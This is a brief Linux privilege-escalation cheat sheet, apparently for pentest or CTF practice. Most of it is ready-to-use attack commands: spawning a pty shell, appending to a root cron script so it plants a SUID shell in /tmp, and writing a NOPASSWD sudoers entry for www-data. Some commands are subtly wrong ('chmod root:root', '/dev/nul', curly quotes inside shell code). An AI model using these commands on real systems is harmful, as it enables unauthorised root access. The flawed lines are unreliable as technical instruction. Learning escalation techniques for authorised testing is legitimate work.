Linux Privilege escalation
==========================

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits


***1. Command to get bash shell from $***

$ python -c 'import pty; pty.spawn("/bin/bash");'  
user@machine:


**2. Identifcation methods**
1. Check su privileged files

2. Check cronjobs
cd /etc/cron* - Check all the folders

3. Check the programs avilable in the machine

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/nul

**3. Using vulnerable cronjob running in root**

echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh

**4. Modifying sudoers file and provide nopasswd access for a low privileged user**

echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update

**5. Command to writable directories in the restrictive shell**

find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;

